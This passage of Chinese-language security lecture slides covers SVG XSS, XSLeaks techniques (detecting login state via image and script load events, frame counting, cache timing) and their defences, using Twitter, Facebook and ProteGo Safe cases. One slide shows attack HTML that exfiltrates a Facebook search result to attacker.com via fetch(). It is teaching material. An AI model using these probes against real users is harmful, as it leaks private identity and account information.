</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="74" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="74" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="svg-%E8%88%87%E5%85%B6%E4%BB%96%E5%9C%96%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E5%B7%AE%E7%95%B0">SVG 與其他圖片格式的差異</h2>
<ul>
<li>SVG 支援執行 JavaScript，可能被用來觸發 XSS</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;

&lt;svg version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
  &lt;script type=&quot;text/javascript&quot;&gt;
    alert(&quot;Hello&quot;);
  &lt;/script&gt;
&lt;/svg&gt;
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="75" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="75" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E4%B8%80%E8%88%AC%E7%B6%B2%E7%AB%99%E7%9A%84%E5%9C%96%E7%89%87%E4%B8%8A%E5%82%B3">一般網站的圖片上傳：</h3>
<ul>
<li>圖片可能被儲存在 S3 或其他隔離的網域。</li>
<li>即便觸發 XSS，影響範圍僅限於圖片網域。</li>
</ul>
<h3 id="nft-%E7%B6%B2%E7%AB%99%E7%9A%84%E4%BE%8B%E5%A4%96%E6%83%85%E6%B3%81">NFT 網站的例外情況</h3>
<ul>
<li>圖片的重要性：NFT 平台高度依賴圖片來展示數字資產。</li>
<li>DoS 攻擊：利用 cookie bomb 干擾圖片加載，嚴重影響平台。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="76" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="76" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E7%AB%A0%E7%AF%80%E5%9B%9E%E9%A1%A7-3">章節回顧</h1>
<ol>
<li>在 Web3 的環境中，為何支持 SVG 上傳可能會引發 XSS 或其他嚴重問題？請舉出具體案例並說明其影響。</li>
</ol>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="77" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="77" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="5-5-%E6%9C%80%E6%9C%89%E8%B6%A3%E7%9A%84%E5%89%8D%E7%AB%AF%E6%97%81%E8%B7%AF%E6%94%BB%E6%93%8Axsleaks">5-5 最有趣的前端旁路攻擊：XSLeaks</h1>
<h2 id="%E4%BB%80%E9%BA%BC%E6%98%AF-xsleaks">什麼是 XSLeaks</h2>
<ul>
<li>全名為 Cross-site leaks</li>
<li>利用技巧從其他網站洩露資訊</li>
</ul>
<h2 id="%E6%B6%89%E5%8F%8A%E7%9A%84%E7%AF%84%E5%9C%8D">涉及的範圍</h2>
<ul>
<li>前後端的溝通、瀏覽器的運作</li>
<li>結合前端技巧與挑戰想像力與創造力</li>
</ul>
<h2 id="%E6%83%B3%E4%BA%86%E8%A7%A3%E4%BB%80%E9%BA%BC%E6%98%AF-xsleaks%E5%BE%97%E5%85%88%E5%BE%9E%E4%BB%80%E9%BA%BC%E6%98%AF%E6%97%81%E8%B7%AF%E6%94%BB%E6%93%8A%E9%96%8B%E5%A7%8B">想了解什麼是 XSLeaks，得先從什麼是旁路攻擊開始</h2>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="78" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="78" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E6%97%81%E8%B7%AF%E6%94%BB%E6%93%8A%E5%B0%B1%E6%98%AF%E4%B8%80%E7%A8%AE%E6%97%81%E6%95%B2%E5%81%B4%E6%93%8A">旁路攻擊，就是一種旁敲側擊</h1>
<h2 id="%E7%AF%84%E4%BE%8B-%E7%87%88%E6%B3%A1%E5%95%8F%E9%A1%8C">範例: 燈泡問題</h2>
<h3 id="%E6%83%85%E5%A2%83-5">情境：</h3>
<p>每個開關對應到另一房間的三個燈泡，需判斷每個開關對應的燈泡，只能進房間一次。</p>
<h3 id="%E6%96%B9%E6%B3%95">方法:</h3>
<ul>
<li>打開 A 開關幾分鐘後關掉，再打開 B 開關。</li>
<li>亮燈的 = B 開關、不亮但熱的燈泡 = A 開關。</li>
<li>不亮且不熱的燈泡 = C 開關。</li>
</ul>
<h3 id="%E9%97%9C%E9%8D%B5">關鍵:</h3>
<p>利用開燈所產生的副作用(溫度)來推斷就叫旁路攻擊。</p>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="79" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="79" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E4%BB%80%E9%BA%BC%E6%98%AF%E6%97%81%E8%B7%AF%E6%94%BB%E6%93%8A">什麼是旁路攻擊？</h2>
<ul>
<li>攻擊者利用目標系統的副作用（Side Effect）來推斷資訊。</li>
</ul>
<h2 id="%E7%B6%B2%E9%A0%81%E7%9A%84%E6%97%81%E8%B7%AF%E6%94%BB%E6%93%8Axs-leaks">網頁的旁路攻擊:XS-Leaks</h2>
<ul>
<li>瀏覽器阻止存取非同源網站資訊（同源政策）</li>
<li>XSLeaks 就是在網頁前端中試著用旁路攻擊的方式繞過同源政策限制，去洩露出另一個不同來源網站的資訊</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="80" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="80" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="xsleaks-%E5%AF%A6%E9%9A%9B%E9%AB%94%E9%A9%97">XSLeaks 實際體驗</h1>
<h3 id="%E6%AA%A2%E6%B8%AC%E6%9C%89%E5%9C%A8%E5%93%AA%E4%BA%9B%E7%B6%B2%E7%AB%99%E7%99%BB%E5%85%A5%E7%9A%84%E7%B6%B2%E9%A0%81httpsbrowserleakscomsocial-%E6%9C%83%E7%9C%8B%E5%88%B0%E4%BB%A5%E4%B8%8B%E5%9C%96%E7%89%87">檢測有在哪些網站登入的網頁：<a href="https://browserleaks.com/social">https://browserleaks.com/social</a> ，會看到以下圖片:</h3>
<p><img src="image-3.png" alt="alt text" /></p>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="81" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="81" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E4%B8%8A%E9%9D%A2%E7%B6%B2%E7%AB%99%E5%A6%82%E4%BD%95%E8%BE%A6%E5%88%B0%E7%9A%84">上面網站如何辦到的?</h2>
<ul>
<li>使用 HTML &lt;img&gt; 的 onload 和 onerror 事件判斷資源是否成功載入</li>
<li>不只 response 的狀態碼是 200 ，若資源是圖片，觸發 onload；若不是圖片，觸發 onerror。</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;img src=&quot;URL&quot; onerror=&quot;alert('error')&quot; onload=&quot;alert('load')&quot;&gt;
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="82" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="82" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E7%99%BB%E5%85%A5%E5%BE%8C%E7%9A%84%E9%87%8D%E6%96%B0%E5%B0%8E%E5%90%91%E6%A9%9F%E5%88%B6">登入後的重新導向機制</h2>
<ul>
<li>
<p>網站行為:</p>
<ul>
<li>未登入：跳轉至登入頁。</li>
<li>已登入：直接導向目標頁。</li>
</ul>
</li>
<li>
<p>情境:</p>
<p>想看自己在購物網站的訂單資訊前往網址:<code>https://shop.example.com/orders/12345</code></p>
</li>
<li>
<p>未登入<br />
會被導到 <code>https://shop.example.com/login?redirect=/orders/12345</code></p>
</li>
<li>
<p>登入<br />
就會到原本想去的訂單網頁</p>
</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="83" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="83" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E7%B5%90%E5%90%88%E5%9C%96%E7%89%87%E8%BC%89%E5%85%A5%E8%88%87%E7%99%BB%E5%85%A5%E5%BE%8C%E9%87%8D%E6%96%B0%E5%B0%8E%E5%90%91%E4%BB%A5-medium-%E7%82%BA%E4%BE%8B">結合圖片載入與登入後重新導向(以 Medium 為例)</h3>
<ul>
<li>重新導向功能(logo 網址：<code>https://medium.com/favicon.ico</code>):</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>https://medium.com/m/login-redirect
?redirectUrl=https%3A%2F%2Fmedium.com%2Ffavicon.ico
</code></pre>
<ul>
<li>利用重新導向機制與圖片載入判斷，用 HTML 判斷登入狀態</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;img
  src=&quot;https://medium.com/m/login-redirect?redirectUrl=https%3A%2F%2Fmedium.com%2Ffavicon.ico&quot;
  onerror=&quot;alert('Not logged in')&quot;
  onload=&quot;alert('logged in')&quot;&gt;
</code></pre>
<ul>
<li>結果<br />
使用者有登入的話到 onload：使用者已登入，反之 onerror：使用者未登入。</li>
<li>結論: 透過這個「登入後重新導向」的行為，再結合圖片的載入與否，去判斷出一個使用者是否處於登入狀態，這就是經典的 XSLeaks。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="84" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="84" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E5%88%A9%E7%94%A8%E7%8B%80%E6%85%8B%E7%A2%BC%E7%9A%84-xsleaks">利用狀態碼的 XSLeaks</h1>
<h2 id="script-%E7%9A%84%E7%89%B9%E6%80%A7%E8%88%87%E7%8B%80%E6%85%8B%E7%A2%BC%E6%AA%A2%E6%B8%AC">&lt;script&gt; 的特性與狀態碼檢測</h2>
<ul>
<li>與 &lt;img&gt; 的差異
<ul>
<li>&lt;img&gt; 會檢查內容是否為圖片，非圖片則觸發 onerror</li>
<li>&lt;script&gt; 則只檢查狀態碼：
<ul>
<li>200 狀態碼：觸發 onload，即使內容非 JavaScript。</li>
<li>非 200 狀態碼：觸發 onerror。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="%E5%9B%A0%E6%AD%A4%E6%88%91%E5%80%91%E5%8F%AF%E4%BB%A5%E7%94%A8-script-%E6%A8%99%E7%B1%A4%E4%BE%86%E9%96%93%E6%8E%A5%E7%9F%A5%E9%81%93%E4%B8%80%E5%80%8B-url-%E7%9A%84%E7%8B%80%E6%85%8B%E7%A2%BC%E6%98%AF%E6%88%90%E5%8A%9F%E9%82%84%E6%98%AF%E5%A4%B1%E6%95%97%E5%83%8F%E9%80%99%E6%A8%A3">因此，我們可以用 &lt;script&gt; 標籤來間接知道一個 URL 的狀態碼是成功還是失敗，像這樣</h3>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="85" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="85" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>const express = require('express');
const app = express();

app.get('/200', (req, res) =&gt; {
  res.writeHead(200, { 'Content-Type': 'text/html'})
  res.write('&lt;h1&gt;hlelo&lt;/h1&gt;')
  res.end()
});

app.get('/400', (req, res) =&gt; {
  res.writeHead(400)
  res.end()
});

app.get('/', (req, res) =&gt; {
  res.writeHead(200, { 'Content-Type': 'text/html' })
  res.write('&lt;script src=&quot;/200&quot; onerror=alert(&quot;200_error&quot;) onload=alert(&quot;200_load&quot;)&gt;&lt;/script&gt;')
  res.write('&lt;script src=&quot;/400&quot; onerror=alert(&quot;400_error&quot;) onload=alert(&quot;400_load&quot;)&gt;&lt;/script&gt;')
  res.end()
});

app.listen(5555, () =&gt; {
  console.log('Server is running on port 5555');
});
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="86" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="86" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E7%B5%90%E6%9E%9C">結果</h3>
<ul>
<li>訪問首頁時，看到 200_load 與 400_error</li>
<li>console 顯示的錯誤訊息</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>Uncaught SyntaxError: Unexpected token '&lt;' (at 200:1:1)
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="87" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="87" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E6%A1%88%E4%BE%8Btwitter-id-exposure-via-error-based-side-channel-attack">案例:<a href="https://hackerone.com/reports/505424">Twitter ID exposure via error-based side-channel attack</a></h2>
<h3 id="%E6%83%85%E5%A2%83-6">情境 :</h3>
<ul>
<li>Twitter 的 API 回傳使用者相關資訊: <code>https://developer.twitter.com/api/users/USER_ID/client-applications.json</code></li>
<li>沒登入，或是登入了可是 USER_ID 對不上，就會回傳 403 狀態碼</li>
</ul>
<h3 id="%E6%94%BB%E6%93%8A%E5%8F%AF%E4%BB%A5%E6%88%90%E8%A1%8C%E7%9A%84%E5%8E%9F%E5%9B%A0">攻擊可以成行的原因 :</h3>
<p>利用狀態碼的差異，判斷用戶是否為某特定對象</p>
<h3 id="%E6%94%BB%E6%93%8A%E6%96%B9%E5%BC%8F-2">攻擊方式</h3>
<p>在部落格中嵌入以下程式碼，只要 USER_ID 正確且用戶登入，觸發 onload，暴露用戶身份</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;script src=https://developer.twitter.com/api/users/12345/client-applications.json onload=&quot;alert('嗨嗨小明，我知道你在看！')&quot;&gt;
&lt;/script&gt;
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="88" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="88" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="xsleaks-%E7%9A%84%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F">XSLeaks 的防禦方式</h1>
<h2 id="%E6%96%B9%E6%B3%95%E4%B8%80--same-site-cookie">方法一 : Same-Site Cookie</h2>
<h3 id="%E6%A9%9F%E5%88%B6">機制：</h3>
<ul>
<li>設置 SameSite=Lax，無論是用 <code>&lt;img&gt;</code> 或 <code>&lt;script&gt;</code>都不會攜帶 cookie。</li>
<li>瀏覽器現已預設啟用，除非設置為 SameSite=None。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="89" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="89" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E6%96%B9%E6%B3%95%E4%BA%8Ccross-origin-resource-policycrop">方法二：Cross-Origin-Resource-Policy（CROP）</h2>
<h3 id="%E6%8F%8F%E8%BF%B0">描述:</h3>
<p>資源版的 CORS header，可限制哪些網站能載入資源</p>
<h3 id="%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法:</h3>
<p>加上 Cross-Origin-Resource-Policy: same-origin</p>
<h3 id="%E6%95%88%E6%9E%9C">效果:</h3>
<p>剛剛的範例中無論是 200 還是 400，script 都會執行到 onerror 事件，console 會出現錯誤</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>GET http://localhost:5555/200 net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 200 (OK) GET http://localhost:5555/400 net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 400 (Bad Request)
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="90" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="90" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E6%96%B9%E6%B3%95%E4%B8%89--fetch-metadata">方法三 : Fetch Metadata</h2>
<h3 id="%E6%8F%8F%E8%BF%B0-1">描述</h3>
<p>當網頁發出 request 時，瀏覽器會自動加上的 header</p>
<h3 id="%E5%B8%B8%E8%A6%8B%E7%9A%84-header">常見的 header：</h3>
<ul>
<li>Sec-Fetch-Site，發出請求的網站跟目標網站的關係</li>
<li>Sec-Fetch-Mode，發出請求的模式</li>
<li>Sec-Fetch-Dest，請求的目的地</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="91" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="91" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E8%88%89%E5%80%8B%E5%B0%8F%E4%BE%8B%E5%AD%90%E8%AA%AA%E6%98%8E">舉個小例子說明 :</h3>
<p>從一個 cross-origin 的地方在頁面上使用 <code>&lt;script&gt;</code> 標籤載入 <code>http://localhost:5555/200</code>，header 會是</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
</code></pre>
<h3 id="%E4%BC%BA%E6%9C%8D%E5%99%A8%E9%98%B2%E7%A6%A6">伺服器防禦：</h3>
<p>根據 Header 阻止非預期請求</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>app.use((req, res, next) =&gt; {
  if (req.headers['Sec-Fetch-Dest'] !== 'empty') {
    res.end('Error');
    return;
  }
  next();
});
</code></pre>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="92" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="92" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="sec-fetch-site-%E7%9A%84%E5%80%BC%E4%B8%BB%E8%A6%81%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%B9%BE%E7%A8%AE">Sec-Fetch-Site 的值主要有以下幾種</h3>
<ul>
<li>same-origin</li>
<li>same-site</li>
<li>cross-site</li>
<li>none（無法歸類在上面的，例如說瀏覽器從書籤點開網站）</li>
</ul>
<h3 id="sec-fetch-mode-%E6%9C%89%E9%80%99%E5%B9%BE%E7%A8%AE">Sec-Fetch-Mode 有這幾種：</h3>
<ul>
<li>same-origin</li>
<li>no-cors</li>
<li>cors</li>
<li>navigate</li>
</ul>
<h3 id="sec-fetch-dest-%E7%9A%84%E5%80%BC%E5%9B%A0%E7%82%BA%E5%A4%AA%E5%A4%9A%E4%B8%8D%E5%88%97%E5%87%BA%E4%BA%86">Sec-Fetch-Dest 的值因為太多不列出了</h3>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="93" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="93" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E6%96%B9%E6%B3%95%E5%9B%9B-%E7%B5%B1%E4%B8%80%E7%8B%80%E6%85%8B%E7%A2%BC%E7%82%BA-200">方法四: 統一狀態碼為 200</h2>
<h3 id="%E6%96%B9%E6%B3%95-1">方法</h3>
<p>所有回應都設為 200，差異放在 body 中</p>
<h3 id="%E5%84%AA%E9%BB%9E">優點</h3>
<p>避免利用狀態碼差異進行攻擊</p>
<h3 id="%E7%BC%BA%E9%BB%9E">缺點</h3>
<p>可能需改動後端與前端的邏輯</p>
<h3 id="%E6%8F%90%E9%86%92">提醒</h3>
<p>特地改動狀態碼來防範攻擊不是件好事，牽涉到的東西很多，有可能前端也要跟著改。建議先透過 same-site cookie 去做防禦。</p>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="94" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="94" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E5%85%B6%E4%BB%96%E5%8F%AF%E4%BB%A5-leak-%E7%9A%84%E6%9D%B1%E8%A5%BF">其他可以 leak 的東西</h1>
<h3 id="%E5%88%A9%E7%94%A8-frames-%E6%95%B8%E9%87%8F%E9%80%B2%E8%A1%8C%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2">利用 Frames 數量進行資訊洩露</h3>
<ul>
<li>Cross-origin 的 window 雖然受同源政策限制，但仍可獲取部分資訊</li>
<li>Frames 的數量是其中之一</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>var win = window.open('http://localhost:5555')
// 等 window 載入完成
setTimeout(() =&gt; {
  alert(win.frames.length)
}, 1000)
</code></pre>
<h3 id="%E6%95%88%E6%9E%9C-1">效果</h3>
<ul>
<li>frames.length = 0：沒有 iframe。</li>
<li>frames.length = 1：包含一個 iframe。</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="95" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="95" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E6%A1%88%E4%BE%8B-2">案例 :</h1>
<p>資安公司 Imperva 部落格中的：<a href="https://www.imperva.com/blog/archive/facebook-privacy-bug/">Patched Facebook Vulnerability Could Have Exposed Private Information About You and Your Friends</a></p>
<h3 id="%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1">漏洞描述</h3>
<p>Facebook 搜尋頁面，若有結果頁面會包含一個 iframe，若無結果頁面沒有 iframe。</p>
<h3 id="%E6%94%BB%E6%93%8A%E6%9C%89%E6%95%88%E5%8E%9F%E5%9B%A0">攻擊有效原因</h3>
<p>利用 frames.length 得知搜尋是否有結果</p>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="96" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="96" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B">攻擊流程</h3>
<ul>
<li>先準備一個 HTML 檔:</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;script&gt;
  let win = window.open('https://www.facebook.com/search/str/chen/users-named/me/friends/intersect')
  setTimeout(() =&gt; {
    if (win.frames.length === 0) {
      fetch('https://attacker.com/?result=no')
    } else {
      fetch('https://attacker.com/?result=yes')
    }
    win.close()
  }, 2000)
&lt;/script&gt;
</code></pre>
<ul>
<li>再將這個網頁傳給目標</li>
<li>目標打開後，攻擊者就會收到搜尋結果</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="97" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="97" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E7%84%A1%E6%95%88%E7%9A%84%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F">無效的防禦方式</h3>
<ul>
<li>Same-site Cookie:因為使用的是 window.open，即使 SameSite=Lax，cookie 仍會帶上，除非 SameSite=strict。</li>
<li>Fetch Metadata : 因為這其實是一個正常的 request</li>
</ul>
<h3 id="%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F-1">防禦方式</h3>
<ul>
<li>在 header 加入 COOP（Cross-Origin-Opener-Policy），使新開的 window 與原始頁面斷開連結，無法存取 win.frames</li>
<li>修改搜尋結果頁面，無論有沒有搜尋到，要嘛就都有 iframe，要嘛就都沒有，就無法透過 iframe 的數量去洩露資訊。</li>
</ul>
<h3 id="%E5%82%99%E8%A8%BB-1">備註</h3>
<p>Google 本身在 bug bounty 這一塊就特別有一個頁面在講 XSLeaks，大多問題都可以到這邊看(<a href="https://bughunters.google.com/learn/invalid-reports/web-platform/xsleaks/5022006283862016/xsleaks-and-xs-search">連結</a>)</p>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="98" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="98" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E7%AB%A0%E7%AF%80%E5%9B%9E%E9%A1%A7-4">章節回顧</h1>
<ol>
<li>
<p>什麼是 XSLeaks？請解釋其基本概念。</p>
</li>
<li>
<p>如何利用 <code>&lt;img&gt;</code> 標籤和登入後的重新導向功能，判斷使用者是否在其他網站處於登入狀態？</p>
</li>
</ol>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="99" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="99" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="5-6-xs-leaks-%E7%9A%84%E9%80%B2%E9%9A%8E%E6%87%89%E7%94%A8-xs-search-%E8%88%87-cache-probing">5-6 XS-Leaks 的進階應用 XS-Search 與 Cache probing</h1>
<h3 id="xs-search">XS-Search</h3>
<ul>
<li>XSLeaks 跟搜尋這兩件事情結合在一起來進行攻擊</li>
</ul>
<h3 id="%E5%BD%B1%E9%9F%BF%E5%8A%9B-2">影響力</h3>
<ul>
<li>搜尋結果通常包含用戶專屬或敏感的內容，通常是私密的</li>
<li>可以透過推敲搜尋結果取得機密資訊</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="100" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="100" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="cache-probing">Cache probing</h1>
<h2 id="%E5%BF%AB%E5%8F%96cache">快取(Cache)</h2>
<p>工作原理 : 用戶請求資料，伺服器返回數據並將其存入快取，用戶再請求相同資料時，系統優先檢查快取，若存在則直接返回。</p>
<p>效用 : 以空間換取時間，提升效率。</p>
<p>快取的種類:</p>
<ul>
<li>瀏覽器快取</li>
<li>DNS 快取</li>
<li>CPU 的 L1/L2 快取</li>
<li>JavaScript 處理的快取</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="101" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="101" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h2 id="%E4%BB%80%E9%BA%BC%E6%98%AF-cache-probing">什麼是 Cache probing?</h2>
<p>介紹 : 檢測資源是否存在於快取中，來回推原本的資訊，之前提過的 CPU 漏洞 Spectre 與 Meltdown 就與快取有關(在課本 p4-34)</p>
<p>運作方式:</p>
<ul>
<li>資源在快取中時載入速度更快</li>
<li>比較載入時間，即可得知是否已被快取</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="102" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="102" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h1 id="%E6%A1%88%E4%BE%8B-3">案例 :</h1>
<p>2020 年 Securitum 發現 App ProteGo Safe 的漏洞 : <a href="https://www.youtube.com/watch?v=Cknka1pN268">Leaking COVID risk group via XS-Leaks</a></p>
<h3 id="%E6%83%85%E5%A2%83-7">情境 :</h3>
<p>該網站會根據民眾填寫問卷回報的健康狀況顯示不同的圖片</p>
<ul>
<li>High: high.png</li>
<li>Medium: medium.png</li>
<li>Low: low.png</li>
<li>Very low: very_low.png</li>
</ul>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="103" data-paginate="true" data-theme="default" lang="zh-TW" data-marpit-pagination="103" style="--paginate:true;--theme:default;" data-marpit-pagination-total="123">
<h3 id="%E6%94%BB%E6%93%8A%E6%96%B9%E6%B3%95">攻擊方法</h3>
<ul>
<li>從載入圖片的時間偵測使用者目前回報的身體狀況，用來偵測程式碼如下</li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;img src=&quot;https://example.com/high.png&quot;&gt;
&lt;img src=&quot;https://example.com/medium.png&quot;&gt;
&lt;img src=&quot;https://example.com/low.png&quot;&gt;
&lt;img src=&quot;https://example.com/very_low.png&quot;&gt;
</code></pre>
<ul>
<li>每一張圖片載入時間可以用 performance.getEntries() 取得，來判斷用戶健康狀況。</li>
</ul>
<p><img src="image-4.png" alt="alt text" /></p>
